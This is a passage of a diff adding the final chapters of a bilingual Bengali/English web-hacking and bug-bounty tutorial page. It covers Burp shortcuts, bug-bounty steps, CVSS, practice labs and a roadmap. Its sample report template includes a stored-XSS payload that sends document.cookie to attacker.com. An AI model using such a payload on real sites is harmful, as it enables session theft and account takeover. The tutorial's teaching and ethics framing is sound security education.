+      <div class="box-t">⌨️ <span class="bn-text">Burp Suite দরকারি Shortcut</span><span class="en-text">Useful Burp Suite Shortcuts</span></div>
+      <table style="margin:0;">
+        <thead><tr><th>Shortcut</th><th><span class="bn-text">কাজ</span><span class="en-text">Action</span></th></tr></thead>
+        <tbody>
+          <tr><td><code>Ctrl+I</code></td><td><span class="bn-text">Intruder-এ পাঠাও</span><span class="en-text">Send to Intruder</span></td></tr>
+          <tr><td><code>Ctrl+R</code></td><td><span class="bn-text">Repeater-এ পাঠাও</span><span class="en-text">Send to Repeater</span></td></tr>
+          <tr><td><code>Ctrl+U</code></td><td><span class="bn-text">URL decode করো</span><span class="en-text">URL decode</span></td></tr>
+          <tr><td><code>Ctrl+Shift+U</code></td><td><span class="bn-text">URL encode করো</span><span class="en-text">URL encode</span></td></tr>
+          <tr><td><code>Ctrl+F</code></td><td><span class="bn-text">Response-এ খোঁজো</span><span class="en-text">Search in response</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>📌 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>🔄 <span class="bn-text">Proxy = request intercept ও modify</span><span class="en-text">Proxy = intercept and modify requests</span></li>
+        <li>🔁 <span class="bn-text">Repeater = manually test করো বারবার</span><span class="en-text">Repeater = manually test repeatedly</span></li>
+        <li>🎯 <span class="bn-text">Intruder = automated attack (brute force, fuzzing)</span></li>
+        <li>🔓 <span class="bn-text">Decoder = Base64, URL, HTML encode/decode</span></li>
+        <li>📊 <span class="bn-text">Comparer = দুটো response-এর পার্থক্য খোঁজো</span><span class="en-text">Comparer = find differences between responses</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════
+     CH 12: Bug Bounty
+══════════════════════════════════ -->
+<div class="chapter ch12">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 12</div>
+    <div class="chapter-title">💰 <span class="bn-text">Bug Bounty — শুরু থেকে Report পর্যন্ত</span><span class="en-text">Bug Bounty — From Start to Report</span></div>
+    <div class="chapter-desc"><span class="bn-text">Platform বেছে নেওয়া, Scope বোঝা, Bug খোঁজা এবং Professional Report লেখা</span><span class="en-text">Choosing a platform, understanding scope, finding bugs, and writing a professional report</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🚀 <span class="bn-text">Bug Bounty শুরু করার ধাপ</span><span class="en-text">Steps to Start Bug Bounty</span></h2>
+
+    <div class="roadmap-phase">
+      <div class="phase-number" style="background:var(--teal); color:#0a1628;">1</div>
+      <div class="phase-content">
+        <div class="phase-title"><span class="bn-text">Platform-এ Account খোলো</span><span class="en-text">Create Account on Platform</span></div>
+        <p><span class="bn-text"><strong>HackerOne</strong> দিয়ে শুরু করো — সবচেয়ে বড় ও beginner-friendly। Profile সুন্দর করে সাজাও।</span><span class="en-text">Start with <strong>HackerOne</strong> — the biggest and most beginner-friendly. Build a nice profile.</span></p>
+      </div>
+    </div>
+    <div class="roadmap-phase">
+      <div class="phase-number" style="background:var(--blue);">2</div>
+      <div class="phase-content">
+        <div class="phase-title"><span class="bn-text">Program বেছে নাও</span><span class="en-text">Choose a Program</span></div>
+        <p><span class="bn-text">নতুন হলে <strong>broad scope</strong> এবং <strong>high response rate</strong> দেখো। Scope ভালো করে পড়ো।</span><span class="en-text">As a beginner look for <strong>broad scope</strong> and <strong>high response rate</strong>. Read the scope carefully.</span></p>
+      </div>
+    </div>
+    <div class="roadmap-phase">
+      <div class="phase-number" style="background:var(--orange);">3</div>
+      <div class="phase-content">
+        <div class="phase-title"><span class="bn-text">Scope বোঝো</span><span class="en-text">Understand the Scope</span></div>
+        <p><span class="bn-text"><strong>In-scope:</strong> কোন subdomain, কোন vulnerability। <strong>Out-of-scope:</strong> কোন domain test করা নিষেধ। Scope ভায়োলেশন করলে ban হবে!</span><span class="en-text"><strong>In-scope:</strong> which subdomains, which vulnerabilities. <strong>Out-of-scope:</strong> which domains are prohibited. Scope violation = ban!</span></p>
+      </div>
+    </div>
+    <div class="roadmap-phase">
+      <div class="phase-number" style="background:var(--purple);">4</div>
+      <div class="phase-content">
+        <div class="phase-title"><span class="bn-text">Test করো ও Report লেখো</span><span class="en-text">Test and Write Report</span></div>
+        <p><span class="bn-text">বাগ পেলে সাথে সাথে professional report লেখো। ভালো report = বেশি bounty।</span><span class="en-text">When you find a bug, write a professional report immediately. Better report = more bounty.</span></p>
+      </div>
+    </div>
+
+    <h2 class="sec">📝 <span class="bn-text">Professional Bug Report কিভাবে লিখবো?</span><span class="en-text">How to Write a Professional Bug Report?</span></h2>
+
+    <div class="vuln-card">
+      <div class="vuln-header"><h4>📋 Report Template</h4><span class="sev sev-high">HIGH</span></div>
+      <div class="vuln-body">
+        <div class="code" style="margin:0;"><span class="c">## Vulnerability Title</span>
+<span class="g">Stored XSS in Profile Bio Field Leads to Account Takeover</span>
+
+<span class="c">## Severity</span>
+<span class="g">High (CVSS: 8.2)</span>
+
+<span class="c">## Summary</span>
+<span class="g">The profile bio field does not sanitize HTML/JS input, allowing
+stored XSS. An attacker can steal session cookies of any user
+who views the malicious profile.</span>
+
+<span class="c">## Steps to Reproduce</span>
+<span class="g">1. Login to https://target.com
+2. Go to Profile → Edit → Bio field
+3. Enter: &lt;script&gt;document.location='https://attacker.com/steal?c='+document.cookie&lt;/script&gt;
+4. Save profile
+5. Ask victim to view your profile
+6. Victim's cookie appears at attacker.com</span>
+
+<span class="c">## Impact</span>
+<span class="g">An attacker can steal session tokens of any user, leading to
+complete account takeover without user interaction beyond
+viewing a profile page.</span>
+
+<span class="c">## Proof of Concept</span>
+<span class="g">[Screenshot / Video attached]
+Cookie received: session=abc123xyz_victim_token</span>
+
+<span class="c">## Suggested Fix</span>
+<span class="g">- Sanitize all HTML output using DOMPurify or similar
+- Implement Content-Security-Policy header
+- Add HttpOnly flag to session cookie</span></div>
+      </div>
+    </div>
+
+    <h2 class="sec">📊 CVSS — <span class="bn-text">Severity কিভাবে নির্ধারিত হয়</span><span class="en-text">How Severity is Determined</span></h2>
+    <table>
+      <thead><tr><th>Factor</th><th><span class="bn-text">প্রশ্ন</span><span class="en-text">Question</span></th><th><span class="bn-text">Score প্রভাব</span><span class="en-text">Score Impact</span></th></tr></thead>
+      <tbody>
+        <tr><td><span class="bn-text">Attack Vector</span></td><td><span class="bn-text">Network দিয়ে আক্রমণ সম্ভব?</span><span class="en-text">Attack possible over network?</span></td><td><span class="bn-text">Network = বেশি</span><span class="en-text">Network = higher</span></td></tr>
+        <tr><td><span class="bn-text">Attack Complexity</span></td><td><span class="bn-text">কত সহজ?</span><span class="en-text">How easy?</span></td><td><span class="bn-text">Low = বেশি</span><span class="en-text">Low = higher</span></td></tr>
+        <tr><td><span class="bn-text">Privileges Required</span></td><td><span class="bn-text">Login লাগে?</span><span class="en-text">Login needed?</span></td><td><span class="bn-text">None = বেশি</span><span class="en-text">None = higher</span></td></tr>
+        <tr><td><span class="bn-text">Confidentiality Impact</span></td><td><span class="bn-text">Data leak হয়?</span><span class="en-text">Data leaked?</span></td><td><span class="bn-text">High = বেশি</span><span class="en-text">High = higher</span></td></tr>
+        <tr><td><span class="bn-text">Availability Impact</span></td><td><span class="bn-text">Service down হয়?</span><span class="en-text">Service goes down?</span></td><td><span class="bn-text">High = বেশি</span><span class="en-text">High = higher</span></td></tr>
+      </tbody>
+    </table>
+
+    <div class="chapter-summary">
+      <h3>📌 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>🚀 <span class="bn-text">HackerOne → Program → Scope পড়ো → Test → Report</span></li>
+        <li>📝 <span class="bn-text">Good report: Title, Severity, Steps, Impact, PoC, Fix</span></li>
+        <li>📊 CVSS — <span class="bn-text">0-10 scale-এ severity নির্ধারণ</span><span class="en-text">determines severity on 0-10 scale</span></li>
+        <li>⚖️ <span class="bn-text">Scope ভায়োলেশন করো না — ban হবে!</span><span class="en-text">Don't violate scope — you'll get banned!</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════
+     CH 13: Practice Labs & Roadmap
+══════════════════════════════════ -->
+<div class="chapter ch13">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 13</div>
+    <div class="chapter-title">🎯 <span class="bn-text">Practice Lab ও Roadmap</span><span class="en-text">Practice Labs & Roadmap</span></div>
+    <div class="chapter-desc"><span class="bn-text">কোথায় এবং কিভাবে প্র্যাকটিস করবো — কোনো আইনি ঝুঁকি ছাড়া</span><span class="en-text">Where and how to practice — without any legal risk</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🏋️ <span class="bn-text">Practice করার জায়গা</span><span class="en-text">Places to Practice</span></h2>
+
+    <table>
+      <thead><tr><th>Platform</th><th><span class="bn-text">কী শেখায়</span><span class="en-text">What it teaches</span></th><th><span class="bn-text">কঠিনতা</span><span class="en-text">Level</span></th><th>URL</th></tr></thead>
+      <tbody>
+        <tr><td><strong>PortSwigger Web Academy</strong></td><td><span class="bn-text">সব web vuln — বিস্তারিত</span><span class="en-text">All web vulns — detailed</span></td><td><span class="badge badge-g">Beginner → Advanced</span></td><td>portswigger.net/web-security</td></tr>
+        <tr><td><strong>TryHackMe</strong></td><td><span class="bn-text">Guided learning, CTF</span><span class="en-text">Guided learning, CTF</span></td><td><span class="badge badge-g">Beginner friendly</span></td><td>tryhackme.com</td></tr>
+        <tr><td><strong>HackTheBox</strong></td><td>CTF, Machines, Challenges</td><td><span class="badge badge-o">Intermediate</span></td><td>hackthebox.com</td></tr>
+        <tr><td><strong>DVWA</strong></td><td><span class="bn-text">Local lab, সব vulnerability</span><span class="en-text">Local lab, all vulnerabilities</span></td><td><span class="badge badge-g">Beginner</span></td><td><span class="bn-text">localhost-এ install</span><span class="en-text">install on localhost</span></td></tr>
+        <tr><td><strong>OWASP Juice Shop</strong></td><td><span class="bn-text">Modern web app hacking</span><span class="en-text">Modern web app hacking</span></td><td><span class="badge badge-b">All levels</span></td><td>owasp.org/www-project-juice-shop</td></tr>
+        <tr><td><strong>PentesterLab</strong></td><td>Web pentesting certificates</td><td><span class="badge badge-o">Intermediate</span></td><td>pentesterlab.com</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">📅 <span class="bn-text">৬ মাসের Roadmap — Zero থেকে First Bug</span><span class="en-text">6 Month Roadmap — Zero to First Bug</span></h2>
+
+    <div class="roadmap-phase">
+      <div class="phase-number" style="background:var(--teal); color:#0a1628;">১-২</div>
+      <div class="phase-content">
+        <div class="phase-title">🌱 <span class="bn-text">মাস ১-২: Foundation</span><span class="en-text">Month 1-2: Foundation</span></div>
+        <p style="color:#555;"><span class="bn-text">HTTP, Burp Suite setup, HTML/JS basics, Linux terminal basics</span></p>
+        <div class="phase-items">
+          <span class="phase-item badge-g">এই গাইড পড়ো</span>
+          <span class="phase-item badge-g">Burp Suite সেটআপ</span>
+          <span class="phase-item badge-g">TryHackMe: Web Fundamentals</span>
+          <span class="phase-item badge-g">PortSwigger: SQL Injection labs</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="roadmap-phase">
+      <div class="phase-number" style="background:var(--blue);">৩-৪</div>
+      <div class="phase-content">
+        <div class="phase-title">⚡ <span class="bn-text">মাস ৩-৪: Vulnerability Practice</span><span class="en-text">Month 3-4: Vulnerability Practice</span></div>
+        <p style="color:#555;"><span class="bn-text">OWASP Top 10 সব পড়ো ও practice করো</span><span class="en-text">Study and practice all OWASP Top 10</span></p>
+        <div class="phase-items">
+          <span class="phase-item badge-b">PortSwigger XSS labs</span>
+          <span class="phase-item badge-b">DVWA সব module</span>
+          <span class="phase-item badge-b">Juice Shop challenges</span>
+          <span class="phase-item badge-b">TryHackMe OWASP room</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="roadmap-phase">
+      <div class="phase-number" style="background:var(--orange);">৫-৬</div>
+      <div class="phase-content">
+        <div class="phase-title">🏆 <span class="bn-text">মাস ৫-৬: Real Targets</span><span class="en-text">Month 5-6: Real Targets</span></div>
+        <p style="color:#555;"><span class="bn-text">HackerOne-এ প্রথম Bug Bounty program-এ কাজ শুরু করো</span><span class="en-text">Start working on your first Bug Bounty program on HackerOne</span></p>
+        <div class="phase-items">
+          <span class="phase-item badge-o">HackerOne signup</span>
+          <span class="phase-item badge-o">Public programs-এ test</span>
+          <span class="phase-item badge-o">Report লেখা practice</span>
+          <span class="phase-item badge-o">Community Discord-এ যোগ</span>
+        </div>
+      </div>
+    </div>
+
+    <h2 class="sec">📚 <span class="bn-text">দরকারি Resources</span><span class="en-text">Essential Resources</span></h2>
+    <div class="grid2">
+      <div class="card success-card">
+        <h4>📖 <span class="bn-text">পড়ার বই ও গাইড</span><span class="en-text">Books & Guides to Read</span></h4>
+        <ul>
+          <li><strong>The Web Application Hacker's Handbook</strong></li>
+          <li><strong>Bug Bounty Bootcamp</strong> — Vickie Li</li>
+          <li><strong>OWASP Testing Guide</strong> (free)</li>
+          <li><strong>HackTricks</strong> — book.hacktricks.xyz</li>
+          <li><strong>PayloadsAllTheThings</strong> — GitHub</li>
+        </ul>
+      </div>
+      <div class="card purple-card">
+        <h4>🎥 <span class="bn-text">YouTube Channel</span><span class="en-text">YouTube Channels</span></h4>
+        <ul>
+          <li>🔴 <strong>Nahamsec</strong></li>
+          <li>🔵 <strong>STÖK</strong></li>
+          <li>🟢 <strong>InsiderPhD</strong></li>
+          <li>🟡 <strong>LiveOverflow</strong></li>
+          <li>🟠 <strong>The Cyber Mentor</strong></li>
+        </ul>
+      </div>
+    </div>
+
+    <h2 class="sec">🏅 <span class="bn-text">OWASP Top 10 — Quick Reference</span><span class="en-text">OWASP Top 10 — Quick Reference</span></h2>
+    <table>
+      <thead><tr><th>#</th><th>Vulnerability</th><th><span class="bn-text">আমরা কোথায় শিখেছি</span><span class="en-text">Where we learned it</span></th></tr></thead>
+      <tbody>
+        <tr><td>A01</td><td>Broken Access Control</td><td><span class="badge badge-b">Ch. 7 — IDOR</span></td></tr>
+        <tr><td>A02</td><td>Cryptographic Failures</td><td><span class="badge badge-y">Ch. 2 — HTTPS</span></td></tr>
+        <tr><td>A03</td><td>Injection (SQLi, XSS)</td><td><span class="badge badge-r">Ch. 5, 6</span></td></tr>
+        <tr><td>A04</td><td>Insecure Design</td><td><span class="badge badge-b">Ch. 10 — Business Logic</span></td></tr>
+        <tr><td>A05</td><td>Security Misconfiguration</td><td><span class="badge badge-y">Ch. 2, 4</span></td></tr>
+        <tr><td>A06</td><td>Vulnerable Components</td><td><span class="badge badge-g">Ch. 4 — Recon</span></td></tr>
+        <tr><td>A07</td><td>Auth & Session Failures</td><td><span class="badge badge-r">Ch. 7 — Auth</span></td></tr>
+        <tr><td>A08</td><td>Software Integrity Failures</td><td><span class="badge badge-p">Advanced topic</span></td></tr>
+        <tr><td>A09</td><td>Security Logging Failures</td><td><span class="badge badge-p">Blue team topic</span></td></tr>
+        <tr><td>A10</td><td>SSRF</td><td><span class="badge badge-r">Ch. 8 — SSRF</span></td></tr>
+      </tbody>
+    </table>
+
+    <div class="box danger">
+      <div class="box-t">⚠️ <span class="bn-text">সবসময় মনে রেখো</span><span class="en-text">Always Remember</span></div>
+      <ul>
+        <li><span class="bn-text">শুধু <strong>authorized</strong> target-এ কাজ করো</span><span class="en-text">Only work on <strong>authorized</strong> targets</span></li>
+        <li><span class="bn-text">বাগ পেলে exploit করো না — রিপোর্ট করো</span><span class="en-text">If you find a bug, don't exploit it — report it</span></li>
+        <li><span class="bn-text">User data নষ্ট করো না</span><span class="en-text">Don't destroy user data</span></li>
+        <li><span class="bn-text">Hacking skill-এর সাথে নৈতিকতাও শেখো</span><span class="en-text">Learn ethics alongside hacking skills</span></li>
+      </ul>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🎓 <span class="bn-text">তুমি এখন জানো</span><span class="en-text">You Now Know</span></h3>
+      <ul>
+        <li>🌐 <span class="bn-text">HTTP কিভাবে কাজ করে</span><span class="en-text">How HTTP works</span></li>
+        <li>💉 SQLi, XSS, IDOR, CSRF, SSRF, File Upload, Path Traversal</li>
+        <li>🦆 <span class="bn-text">Burp Suite দিয়ে test করা</span><span class="en-text">Testing with Burp Suite</span></li>
+        <li>💰 <span class="bn-text">Bug Bounty Report লেখা</span><span class="en-text">Writing Bug Bounty reports</span></li>
+        <li>🎯 <span class="bn-text">কোথায় practice করবো</span><span class="en-text">Where to practice</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════ FOOTER ══════ -->
+<div class="chapter" style="background: linear-gradient(135deg, #0a1628, #0d2137);">
+  <div class="chapter-body" style="background: transparent;">
+    <div class="page-footer">
+      <p class="quote">🕷️ "The best security researchers think like attackers, but act like defenders."</p>
+      <p style="margin-top:12px;"><span class="bn-text">এই গাইড সম্পূর্ণ শিক্ষামূলক। সবসময় authorized environment-এ practice করো। অন্যের সিস্টেমে আক্রমণ করা আইনত অপরাধ।</span>
+         <span class="en-text">This guide is entirely educational. Always practice in authorized environments. Attacking others' systems is a crime.</span></p>
+      <p style="margin-top:12px; font-size:12px; color:var(--teal);">Web Hacking & Bug Bounty Guide — v1.0 | 13 Chapters | Zero to Hunter</p>
+    </div>
+  </div>
+</div>
+
+<script>
+const body = document.body;
+body.classList.add('light-mode');
+
+function toggleTheme() {
+  const btn = document.getElementById('themeBtn');
+  if (body.classList.contains('light-mode')) {
+    body.classList.replace('light-mode', 'dark-mode');
+    btn.textContent = '☀️ Light Mode';
+    localStorage.setItem('theme', 'dark');
+  } else {
+    body.classList.replace('dark-mode', 'light-mode');
+    btn.textContent = '🌙 Dark Mode';
+    localStorage.setItem('theme', 'light');
+  }
+}
+
+function toggleLang() {
+  const btn = document.getElementById('langBtn');
+  if (body.classList.contains('lang-en')) {
+    body.classList.remove('lang-en');
+    btn.textContent = '🇬🇧 English';
+    localStorage.setItem('lang', 'bn');
+  } else {
+    body.classList.add('lang-en');
+    btn.textContent = '🇧🇩 বাংলা';
+    localStorage.setItem('lang', 'en');
+  }
+}
+
+window.addEventListener('DOMContentLoaded', () => {
+  const savedTheme = localStorage.getItem('theme');
+  const savedLang  = localStorage.getItem('lang');
+  if (savedTheme === 'dark') {
+    body.classList.replace('light-mode', 'dark-mode');
+    const btn = document.getElementById('themeBtn');
+    if (btn) btn.textContent = '☀️ Light Mode';
+  }
+  if (savedLang === 'en') {
+    body.classList.add('lang-en');
+    const btn = document.getElementById('langBtn');
+    if (btn) btn.textContent = '🇧🇩 বাংলা';
+  }
+});
+</script>
+</body>
+</html>
